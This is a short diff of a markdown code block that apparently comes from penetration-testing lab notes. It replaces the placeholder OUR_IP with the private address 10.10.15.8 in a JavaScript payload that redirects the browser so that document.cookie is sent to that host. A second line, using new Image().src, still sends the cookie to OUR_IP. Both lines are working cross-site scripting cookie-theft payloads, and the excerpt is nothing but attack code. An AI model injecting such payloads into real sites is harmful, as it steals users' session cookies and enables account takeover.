@@ -1,5 +1,5 @@
 ```js
-document.location='http://OUR_IP/index.php?c='+document.cookie;
+document.location='http://10.10.15.8/index.php?c='+document.cookie;
 new Image().src='http://OUR_IP/index.php?c='+document.cookie;
 ```
 
